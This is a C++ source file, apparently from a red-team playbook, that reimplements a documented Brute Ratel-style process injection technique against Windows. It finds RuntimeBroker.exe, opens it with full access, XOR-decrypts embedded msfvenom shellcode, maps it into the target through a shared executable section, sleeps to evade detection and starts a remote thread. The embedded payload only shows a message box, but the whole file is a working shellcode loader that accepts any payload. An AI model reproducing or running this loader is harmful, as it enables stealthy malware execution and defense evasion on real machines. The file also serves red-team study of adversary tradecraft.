#include <Windows.h>
#include <TlHelp32.h>
#include <stdlib.h>
#include "CreateSection.h"
#include <iostream>
#pragma comment(lib, "ntdll")

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

// All credits to https://github.com/peperunas/injectopi/blob/master/CreateSection/CreateSection.cpp
// and https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/#Modification-of-Versiondll

/*
    Console version for the purpose of debugging. Uses messagebox shellcode from the file (not from disk). 
*/
BOOL LoadNtdllFunctions() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    ZwOpenProcess = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))GetProcAddress(ntdll, "ZwOpenProcess");
    if (ZwOpenProcess == NULL) return FALSE;

    ZwCreateSection = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))
        GetProcAddress(ntdll, "ZwCreateSection");
    if (ZwCreateSection == NULL) return FALSE;

    NtMapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))
        GetProcAddress(ntdll, "NtMapViewOfSection");
    if (NtMapViewOfSection == NULL) return FALSE;

    ZwCreateThreadEx = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID))
        GetProcAddress(ntdll, "ZwCreateThreadEx");
    if (ZwCreateThreadEx == NULL) return FALSE;

    NtDelayExecution = (NTSTATUS(NTAPI*)(BOOL, PLARGE_INTEGER))GetProcAddress(ntdll, "NtDelayExecution");
    if (NtDelayExecution == NULL) return FALSE;

    ZwClose = (NTSTATUS(NTAPI*)(HANDLE))GetProcAddress(ntdll, "ZwClose");
    if (ZwClose == NULL) return FALSE;

    return TRUE;
}

HANDLE getProcHandlebyName(const char* procName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    NTSTATUS status = NULL;
    HANDLE hProc = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp((entry.szExeFile), procName) == 0) {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid = { (HANDLE)entry.th32ProcessID, NULL };
                InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
                std::wcout << L"[+] Proc name: " << entry.szExeFile << ", [+] id: " << entry.th32ProcessID << "\n";
                // 3. Call the Windows API ntdll ZwOpenProcess using the process ID from step 1. The process is opened with full control access.
                status = ZwOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);

                if (!NT_SUCCESS(status)) {
                    continue;
                }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }
    ZwClose(snapshot);

    return NULL;
}

// credit: Sektor7 RTO Malware Essential Course 
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}



int main()
{
    // Shellcode for debugging purposes 
    // msfvenom -p windows/x64/messagebox text="stage0 shellcode" title="choi redteam playbook" -f c exitfunc=thread --encrypt xor --encrypt-key "jikoewarfkmzsdlhfnuiwaejrpaw" exitfunc=thread -v shellcode
    unsigned char shellcode[] =
        "\x96\x21\xea\x8b\x95\x88\x9e\x8d\x8e\xbb\x6d\x7a\x73\x25\x3d"
        "\x29\x36\x3c\x24\x3f\x3f\x50\xb7\x0f\x3a\xfb\x33\x17\x54\x21"
        "\xe0\x3d\x7d\x49\x29\xf9\x34\x4b\x53\x32\xf8\x16\x3c\x56\x2e"
        "\x61\xc2\x23\x3d\x2c\x54\xa3\x3a\x41\xa1\xdb\x56\x08\x17\x6d"
        "\x49\x57\x20\xb3\xaf\x66\x2c\x7b\xb2\x86\x81\x3a\x27\x3f\x4b"
        "\x21\xfc\x33\x45\x54\xf9\x32\x5d\x3f\x6b\xb9\x55\xe4\xe5\xff"
        "\x61\x72\x66\x23\xe8\xba\x07\x0b\x24\x69\xb6\x3e\x4b\xe2\x3f"
        "\x79\x5b\x2e\xf9\x30\x41\x3e\x6b\xb9\x88\x33\x2d\x88\xa8\x4c"
        "\x27\xe0\x59\xf2\x3b\x65\xba\x25\x57\xa7\x3d\x58\xb7\xcd\x24"
        "\xab\xbb\x7d\x20\x76\xab\x51\x8b\x1a\x94\x49\x2d\x71\x2a\x4f"
        "\x65\x3f\x4a\xb5\x19\xbe\x3e\x50\x31\xe2\x37\x45\x2c\x6b\xa2"
        "\x16\x5f\x36\xe1\x65\x23\x51\x21\xfc\x21\x6e\x2f\x6a\xbd\x44"
        "\x32\xef\x68\xe0\x2e\x6f\xa5\x28\x2f\x20\x3d\x34\x2b\x2a\x20"
        "\x2f\x2b\x30\x2a\x35\x2d\xf4\x8d\x52\x27\x39\x92\x9a\x2b\x25"
        "\x35\x32\x58\x26\xfe\x7b\x9e\x28\x9a\x95\x8d\x2d\x28\xb0\xab"
        "\x69\x6b\x6f\x65\x49\x29\xff\xf3\x71\x6c\x7a\x73\x5a\x20\xe5"
        "\xe3\x45\x74\x69\x77\x29\x54\xa3\x33\xca\x24\xf4\x3c\x6e\x94"
        "\xba\xde\x97\x7c\x58\x6c\x2a\xd7\xdc\xe6\xd9\xf1\x97\xb3\x26"
        "\xf6\xad\x5f\x5d\x63\x16\x78\xf0\x9a\x97\x1f\x6c\xd0\x28\x76"
        "\x05\x0e\x18\x66\x32\x2c\xf3\xa9\x9b\xb9\x1b\x12\x0f\x12\x0c"
        "\x47\x41\x16\x02\x17\x1c\x0d\x14\x05\x0d\x0e\x6f\x06\x1f\x0e"
        "\x1b\x46\x19\x08\x1e\x07\x01\x0d\x05\x46\x1e\x19\x08\x0e\x03"
        "\x0a\x05\x19\x70";


    if (LoadNtdllFunctions() == FALSE) {
        printf("[-] Failed to load NTDLL function\n");
        return -1;
    }

    // 1. Enumerate all process and locate process for RuntimeBroker.exe 
    // https://stackoverflow.com/questions/865152/how-can-i-get-a-process-handle-by-its-name-in-c
    HANDLE hProc = getProcHandlebyName("RuntimeBroker.exe");
    if (hProc == NULL) {
        printf("[-] Process not found. Exiting.\n");
        exit(0);
    }

    // https://github.com/peperunas/injectopi/blob/master/CreateSection/CreateSection.cpp
    HANDLE hSection = NULL;
    NTSTATUS status = NULL;
    SIZE_T size = 4096;
    LARGE_INTEGER sectionSize = { size };
    PVOID pLocalView = NULL, pRemoteView = NULL;
    SIZE_T shellcodeSize = sizeof(shellcode);
    int viewUnMap = 2;

    char key[] = "jikoewarfkmzsdlhfnuiwaejrpaw";

    // 4. Decrypt the payload file using the XOR encryption algorithm with a 28-byte key of: jikoewarfkmzsdlhfnuiwaejrpaw
    XOR((char*)shellcode, shellcodeSize, key, sizeof(key));

    // 5. Call the Windows API NtCreateSection, which creates a block of memory that can be shared between processes.
    if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS) {
        printf("[-] Cannot create section. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Section: %p\n", hSection);

    // 6. Two calls into the Windows API NtMapViewOfSection. The first call maps the contents of the decrypted payload into the current process memory space.
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(),
        &pLocalView, NULL, NULL, NULL,
        &size, viewUnMap, NULL, PAGE_READWRITE)) != STATUS_SUCCESS) {
        printf("[-] Cannot create Local view. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Local view: %p\n", pLocalView);

    printf("[+] Copying shellcode into the view\n");
    // Use for in-library shellcode 
    memcpy(pLocalView, shellcode, sizeof(shellcode));
    
    // Use for on-disk shellcode 
    //memcpy(pLocalView, shellcode, shellcodeSize);

    // 6. Two calls into the Windows API NtMapViewOfSection. The first call maps the contents of the decrypted payload into the current process memory space.
    if ((status = NtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL,
        &size, viewUnMap, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
        printf("[-] Cannot create remote view. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Remote view: %p\n", pRemoteView);


    // 7. Calls the Windows API NtDelayExecution and sleeps (pauses execution) for ~4.27 seconds
    // NtDelayExecution works with console tho. 
    printf("[+] Sleeping for 4.27 seconds...\n");
    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS) {
        printf("[-] Cannot delay execution. Error code: %08X\n", status);
        return -1;
    }

    //Sleep(4270);

    // 8. Call the Windows API NtCreateThreadEx.
    HANDLE hThread = NULL;
    if ((status = ZwCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, pRemoteView, NULL, CREATE_SUSPENDED, 0, 0, 0, 0)) != STATUS_SUCCESS) {
        printf("[-] Cannot create thread. Error code: %08X\n", status);
        return -1;
    }
    printf("[+] Thread: %p\n", hThread);

    // 9. Calls the Windows API NtDelayExecution and sleeps (pauses execution) for ~4.27 
    printf("[+] Sleeping again for 4.27 seconds...\n");
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS) {
        printf("[-] Cannot delay execution. Error code: %08X\n", status);
        return -1;
    }

    // 10. Finished. 
    printf("[+] Executing thread.\n");
    ResumeThread(hThread);

    return 0;
}